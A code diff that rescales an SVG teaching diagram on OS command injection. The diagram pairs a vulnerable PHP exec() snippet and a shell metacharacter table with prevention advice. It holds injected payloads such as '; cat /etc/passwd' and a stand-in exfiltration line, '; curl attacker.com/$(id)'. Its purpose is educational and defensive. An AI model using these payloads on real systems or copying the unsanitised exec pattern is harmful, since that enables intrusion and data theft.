@@ -101,97 +101,96 @@
       <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0" />
     </marker>
   </defs>
-  <rect width="1200" height="580" fill="var(--bg)" rx="6" x="40" y="40"/>
-  <rect x="68.125" y="88.3333" width="196.875" height="104.7223" rx="6" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
-  <text x="166.5625" y="112.5" font-family="Arial,sans-serif" font-size="12.1663" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Attacker Input</text>
-  <text x="86.875" y="133.4444" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">127.0.0.1; whoami</text>
-  <text x="86.875" y="149.5556" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">| cat /etc/passwd</text>
-  <text x="86.875" y="165.6667" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">&amp;&amp; id</text>
-  <text x="86.875" y="183.3889" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">`ls -la`</text>
-  <line x1="265" y1="140.6944" x2="330.625" y2="140.6944" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
-  <text x="297.8124" y="132.6389" font-family="Arial,sans-serif" font-size="10" fill="var(--danger-accent)" text-anchor="middle">HTTP GET/POST</text>
-  <rect x="330.625" y="80.2777" width="253.125" height="136.9444" rx="6" fill="var(--warn-fill)" filter="url(#shadow)" stroke="var(--warn-border)" stroke-width="2" />
-  <rect x="330.625" y="80.2777" width="253.125" height="29" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2"/>
-  <rect x="330.625" y="99.6111" width="253.125" height="9.6667" fill="var(--warn-fill)" rx="6" stroke="var(--warn-border)" stroke-width="2"/>
-  <text x="457.1875" y="98.8056" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--bg)" text-anchor="middle">Web Application</text>
-  <text x="349.375" y="125.3889" font-family="monospace" font-size="10" fill="var(--text-muted)">$host = $_GET['host'];</text>
-  <text x="349.375" y="139.8889" font-family="monospace" font-size="10" fill="var(--text-muted)">$cmd = "ping -c 1 " . $host;</text>
-  <text x="349.375" y="154.3889" font-family="monospace" font-size="10" fill="var(--danger-accent)">exec($cmd, $output);</text>
-  <text x="349.375" y="172.9167" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">No sanitisation!</text>
-  <text x="349.375" y="187.4167" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Unsanitised input → shell string</text>
-  <line x1="583.75" y1="148.75" x2="649.375" y2="148.75" stroke="var(--text-muted)" stroke-width="2" marker-end="url(#arrow)" />
-  <text x="616.5625" y="140.6944" font-family="Arial,sans-serif" font-size="10" fill="var(--text-muted)" text-anchor="middle">shell call</text>
-  <rect x="649.375" y="88.3333" width="299.9999" height="136.9444" rx="6" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
-  <rect x="649.375" y="88.3333" width="299.9999" height="29" rx="6" fill="var(--ok-accent)" />
-  <rect x="649.375" y="107.6667" width="299.9999" height="9.6667" fill="var(--ok-accent)" rx="6"/>
-  <text x="799.375" y="106.8611" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--bg)" text-anchor="middle">Shell (/bin/sh)</text>
-  <text x="668.125" y="135.0556" font-family="monospace" font-size="10.4284" fill="var(--text)">$ ping -c 1 127.0.0.1; whoami</text>
-  <text x="668.125" y="154.3889" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Parsed as TWO commands:</text>
-  <text x="668.125" y="170.5" font-family="monospace" font-size="10.4284" fill="var(--ok-accent)">  ping -c 1 127.0.0.1</text>
-  <text x="668.125" y="185" font-family="monospace" font-size="10.4284" fill="var(--danger-accent)">  whoami              ← injected!</text>
-  <text x="668.125" y="214" font-family="Arial,sans-serif" font-size="10" fill="var(--text-muted)">Runs as web server user (www-data/apache)</text>
-  <line x1="949.375" y1="156.8056" x2="1014.9999" y2="156.8056" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
-  <text x="982.1874" y="148.75" font-family="Arial,sans-serif" font-size="10" fill="var(--danger-accent)" text-anchor="middle">syscall</text>
-  <rect x="1014.9999" y="104.4444" width="196.875" height="88.6111" rx="6" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
-  <text x="1113.4375" y="131.0277" font-family="Arial,sans-serif" font-size="12.1663" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">OS</text>
-  <text x="1113.4375" y="148.75" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" text-anchor="middle">www-data</text>
-  <text x="1113.4375" y="166.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)" text-anchor="middle">output returned</text>
-  <text x="1113.4375" y="180.9723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)" text-anchor="middle">to attacker</text>
-  <rect x="68.125" y="241.3889" width="553.1249" height="161.1111" rx="6" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
-  <text x="344.6875" y="263.9444" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Shell Metacharacters Used in Injection</text>
-  <rect x="86.875" y="273.6111" width="520.3125" height="22.5556" rx="6" fill="var(--surface)" />
-  <text x="115" y="288.9167" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">;</text>
-  <text x="147.8125" y="288.9167" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">Command separator — always runs next command</text>
-  <rect x="86.875" y="299.3889" width="520.3125" height="22.5556" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
-  <text x="115" y="314.6944" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">|</text>
-  <text x="147.8125" y="314.6944" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">Pipe — stdout of cmd1 becomes stdin of cmd2</text>
-  <rect x="86.875" y="325.1667" width="520.3125" height="22.5556" rx="6" fill="var(--surface)" />
-  <text x="115" y="340.4723" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">&amp;&amp;</text>
-  <text x="147.8125" y="340.4723" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">AND — cmd2 only if cmd1 succeeds (exit 0)</text>
-  <rect x="86.875" y="350.9444" width="520.3125" height="22.5556" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
-  <text x="115" y="366.25" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">||</text>
-  <text x="147.8125" y="366.25" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">OR — cmd2 only if cmd1 fails</text>
-  <rect x="86.875" y="376.7223" width="520.3125" height="22.5556" rx="6" fill="var(--surface)" />
-  <text x="115" y="392.0277" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">` `  or $( )</text>
-  <text x="194.6875" y="392.0277" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">Backticks / subshell — command substitution</text>
-  <rect x="649.375" y="241.3889" width="562.5" height="161.1111" rx="6" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
-  <text x="930.6249" y="263.9444" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--text)" text-anchor="middle">Blind vs Visible Injection</text>
-  <rect x="668.125" y="273.6111" width="243.75" height="116.8056" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
-  <text x="790" y="292.1389" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--primary-accent)" text-anchor="middle">Visible (In-Band)</text>
-  <text x="686.875" y="309.8611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">Output appears in response</text>
-  <text x="686.875" y="325.9723" font-family="monospace" font-size="10" fill="var(--text-muted)">; cat /etc/passwd</text>
-  <text x="686.875" y="342.0833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Response contains file content</text>
-  <text x="686.875" y="358.1944" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Easiest to exploit</text>
-  <text x="686.875" y="374.3056" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Confirm with: echo 1234567890</text>
-  <rect x="949.375" y="273.6111" width="243.75" height="116.8056" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
-  <text x="1071.25" y="292.1389" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Blind (Out-of-Band)</text>
-  <text x="968.125" y="309.8611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">No output in response</text>
-  <text x="968.125" y="325.9723" font-family="monospace" font-size="10" fill="var(--text-muted)">; sleep 5</text>
-  <text x="968.125" y="342.0833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Time-based detection</text>
-  <text x="968.125" y="358.1944" font-family="monospace" font-size="10" fill="var(--text-muted)">; curl attacker.com/$(id)</text>
-  <text x="968.125" y="374.3056" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">DNS/HTTP out-of-band exfil</text>
-  <rect x="68.125" y="426.6667" width="1143.7499" height="169.1667" rx="6" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
-  <text x="640" y="449.2223" font-family="Arial,sans-serif" font-size="13.9044" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Prevention</text>
-  <rect x="86.875" y="458.8889" width="328.125" height="120.8333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
-  <text x="250.9375" y="477.4167" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Avoid shell execution</text>
-  <text x="105.625" y="495.1389" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Use language APIs not shell commands</text>
-  <text x="105.625" y="511.25" font-family="monospace" font-size="10" fill="var(--text-muted)">subprocess.run(['ping','-c','1',host])</text>
-  <text x="105.625" y="527.3611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">  (list form — no shell interpretation)</text>
-  <text x="105.625" y="543.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Never pass user input to exec/system</text>
-  <text x="105.625" y="559.5833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Use whitelists, not blacklists</text>
-  <text x="105.625" y="574.0833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Reject inputs not matching regex pattern</text>
-  <rect x="443.125" y="458.8889" width="356.25" height="120.8333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
-  <text x="621.25" y="477.4167" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Sanitise if shell is unavoidable</text>
-  <text x="461.875" y="495.1389" font-family="monospace" font-size="10" fill="var(--text-muted)">escapeshellarg($input)   # PHP</text>
-  <text x="461.875" y="511.25" font-family="monospace" font-size="10" fill="var(--text-muted)">shlex.quote(input)       # Python</text>
-  <text x="461.875" y="527.3611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Wrap input in single quotes</text>
-  <text x="461.875" y="543.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
-  <text x="461.875" y="559.5833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Drop non-alphanumeric chars</text>
-  <rect x="827.5" y="458.8889" width="365.625" height="120.8333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
-  <text x="1010.3125" y="477.4167" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Defence-in-depth</text>
-  <text x="846.2499" y="495.1389" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Run web server as low-privilege user</text>
-  <text x="846.2499" y="511.25" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Use WAF rules to block metacharacters</text>
-  <text x="846.2499" y="527.3611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• AppArmor / SELinux mandatory access</text>
-  <text x="846.2499" y="543.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Containers: restrict /bin and /usr/bin</text>
-  <text x="846.2499" y="559.5833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Log all exec() / system() calls</text>
+  <rect x="40" y="49.062547" width="206.557377" height="117.812554" rx="6.518573" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
+  <text x="143.278689" y="76.250077" font-family="Arial,sans-serif" font-size="13.217819" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Attacker Input</text>
+  <text x="59.672131" y="99.812521" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">127.0.0.1; whoami</text>
+  <text x="59.672131" y="117.937616" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">| cat /etc/passwd</text>
+  <text x="59.672131" y="136.062598" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">&amp;&amp; id</text>
+  <text x="59.672131" y="156.000067" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">`ls -la`</text>
+  <line x1="246.557377" y1="107.968768" x2="315.409836" y2="107.968768" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
+  <text x="280.983502" y="98.906333" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--danger-accent)" text-anchor="middle">HTTP GET/POST</text>
+  <rect x="315.409836" y="40" width="265.57377" height="154.062407" rx="6.518573" fill="var(--warn-fill)" filter="url(#shadow)" stroke="var(--warn-border)" stroke-width="2" />
+  <rect x="315.409836" y="40" width="265.57377" height="32.624991" rx="6.518573" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2"/>
+  <rect x="315.409836" y="61.750069" width="265.57377" height="10.875034" fill="var(--warn-fill)" rx="6.518573" stroke="var(--warn-border)" stroke-width="2"/>
+  <text x="448.196721" y="60.843882" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--bg)" text-anchor="middle">Web Application</text>
+  <text x="335.081967" y="90.750086" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">$host = $_GET['host'];</text>
+  <text x="335.081967" y="107.062581" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">$cmd = "ping -c 1 " . $host;</text>
+  <text x="335.081967" y="123.375077" font-family="monospace" font-size="10.864288" fill="var(--danger-accent)">exec($cmd, $output);</text>
+  <text x="335.081967" y="144.218846" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">No sanitisation!</text>
+  <text x="335.081967" y="160.531341" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Unsanitised input → shell string</text>
+  <line x1="580.983607" y1="117.031316" x2="649.836066" y2="117.031316" stroke="var(--text-muted)" stroke-width="2" marker-end="url(#arrow)" />
+  <text x="615.409836" y="107.968768" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--text-muted)" text-anchor="middle">shell call</text>
+  <rect x="649.836066" y="49.062547" width="314.753993" height="154.062407" rx="6.518573" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
+  <rect x="649.836066" y="49.062547" width="314.753993" height="32.624991" rx="6.518573" fill="var(--ok-accent)" />
+  <rect x="649.836066" y="70.812616" width="314.753993" height="10.875034" fill="var(--ok-accent)" rx="6.518573"/>
+  <text x="807.213115" y="69.906317" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--bg)" text-anchor="middle">Shell (/bin/sh)</text>
+  <text x="669.508197" y="101.62512" font-family="monospace" font-size="11.329714" fill="var(--text)">$ ping -c 1 127.0.0.1; whoami</text>
+  <text x="669.508197" y="123.375077" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Parsed as TWO commands:</text>
+  <text x="669.508197" y="141.500059" font-family="monospace" font-size="11.329714" fill="var(--ok-accent)">  ping -c 1 127.0.0.1</text>
+  <text x="669.508197" y="157.812554" font-family="monospace" font-size="11.329714" fill="var(--danger-accent)">  whoami              ← injected!</text>
+  <text x="669.508197" y="190.437545" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--text-muted)">Runs as web server user (www-data/apache)</text>
+  <line x1="964.590164" y1="126.093863" x2="1033.442518" y2="126.093863" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
+  <text x="999.016289" y="117.031316" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--danger-accent)" text-anchor="middle">syscall</text>
+  <rect x="1033.442518" y="67.18753" width="206.557377" height="99.68746" rx="6.518573" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
+  <text x="1136.721311" y="97.093734" font-family="Arial,sans-serif" font-size="13.217819" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">OS</text>
+  <text x="1136.721311" y="117.031316" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" text-anchor="middle">www-data</text>
+  <text x="1136.721311" y="136.968898" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)" text-anchor="middle">output returned</text>
+  <text x="1136.721311" y="153.281393" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)" text-anchor="middle">to attacker</text>
+  <rect x="40" y="221.250049" width="580.327764" height="181.249937" rx="6.518573" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
+  <text x="330.163934" y="246.62498" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Shell Metacharacters Used in Injection</text>
+  <rect x="59.672131" y="257.500014" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
+  <text x="89.180328" y="274.718809" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">;</text>
+  <text x="123.606557" y="274.718809" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">Command separator — always runs next command</text>
+  <rect x="59.672131" y="286.500031" width="545.901639" height="25.375043" rx="6.518573" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
+  <text x="89.180328" y="303.718714" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">|</text>
+  <text x="123.606557" y="303.718714" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">Pipe — stdout of cmd1 becomes stdin of cmd2</text>
+  <rect x="59.672131" y="315.500048" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
+  <text x="89.180328" y="332.718843" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">&amp;&amp;</text>
+  <text x="123.606557" y="332.718843" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">AND — cmd2 only if cmd1 succeeds (exit 0)</text>
+  <rect x="59.672131" y="344.499952" width="545.901639" height="25.375043" rx="6.518573" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
+  <text x="89.180328" y="361.718747" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">||</text>
+  <text x="123.606557" y="361.718747" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">OR — cmd2 only if cmd1 fails</text>
+  <rect x="59.672131" y="373.500082" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
+  <text x="89.180328" y="390.718652" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">` `  or $( )</text>
+  <text x="172.786885" y="390.718652" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">Backticks / subshell — command substitution</text>
+  <rect x="649.836066" y="221.250049" width="590.163934" height="181.249937" rx="6.518573" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
+  <text x="944.917928" y="246.62498" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--text)" text-anchor="middle">Blind vs Visible Injection</text>
+  <rect x="669.508197" y="257.500014" width="255.737705" height="131.406263" rx="6.518573" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
+  <text x="797.377049" y="278.343783" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--primary-accent)" text-anchor="middle">Visible (In-Band)</text>
+  <text x="689.180328" y="298.281253" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">Output appears in response</text>
+  <text x="689.180328" y="316.406348" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">; cat /etc/passwd</text>
+  <text x="689.180328" y="334.531217" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Response contains file content</text>
+  <text x="689.180328" y="352.6562" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Easiest to exploit</text>
+  <text x="689.180328" y="370.781295" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Confirm with: echo 1234567890</text>
+  <rect x="964.590164" y="257.500014" width="255.737705" height="131.406263" rx="6.518573" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
+  <text x="1092.459016" y="278.343783" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Blind (Out-of-Band)</text>
+  <text x="984.262295" y="298.281253" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">No output in response</text>
+  <text x="984.262295" y="316.406348" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">; sleep 5</text>
+  <text x="984.262295" y="334.531217" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Time-based detection</text>
+  <text x="984.262295" y="352.6562" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">; curl attacker.com/$(id)</text>
+  <text x="984.262295" y="370.781295" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">DNS/HTTP out-of-band exfil</text>
+  <rect x="40" y="429.687516" width="1199.999895" height="190.312484" rx="6.518573" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
+  <text x="640" y="455.062559" font-family="Arial,sans-serif" font-size="15.106141" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Prevention</text>
+  <rect x="59.672131" y="465.937481" width="344.262295" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
+  <text x="231.803279" y="486.78125" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Avoid shell execution</text>
+  <text x="79.344262" y="506.718719" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Use language APIs not shell commands</text>
+  <text x="79.344262" y="524.843702" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">subprocess.run(['ping','-c','1',host])</text>
+  <text x="79.344262" y="542.968684" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">  (list form — no shell interpretation)</text>
+  <text x="79.344262" y="561.093779" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Never pass user input to exec/system</text>
+  <text x="79.344262" y="579.218649" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Use whitelists, not blacklists</text>
+  <text x="79.344262" y="595.531144" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Reject inputs not matching regex pattern</text>
+  <rect x="433.442623" y="465.937481" width="373.770492" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
+  <text x="620.327869" y="486.78125" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Sanitise if shell is unavoidable</text>
+  <text x="453.114754" y="506.718719" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">escapeshellarg($input)   # PHP</text>
+  <text x="453.114754" y="524.843702" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">shlex.quote(input)       # Python</text>
+  <text x="453.114754" y="542.968684" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Wrap input in single quotes</text>
+  <text x="453.114754" y="561.093779" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
+  <text x="453.114754" y="579.218649" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Drop non-alphanumeric chars</text>
+  <rect x="836.721311" y="465.937481" width="383.606557" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
+  <text x="1028.52459" y="486.78125" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Defence-in-depth</text>
+  <text x="856.393338" y="506.718719" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Run web server as low-privilege user</text>
+  <text x="856.393338" y="524.843702" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Use WAF rules to block metacharacters</text>
+  <text x="856.393338" y="542.968684" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• AppArmor / SELinux mandatory access</text>
+  <text x="856.393338" y="561.093779" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Containers: restrict /bin and /usr/bin</text>
+  <text x="856.393338" y="579.218649" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Log all exec() / system() calls</text>
 </svg>
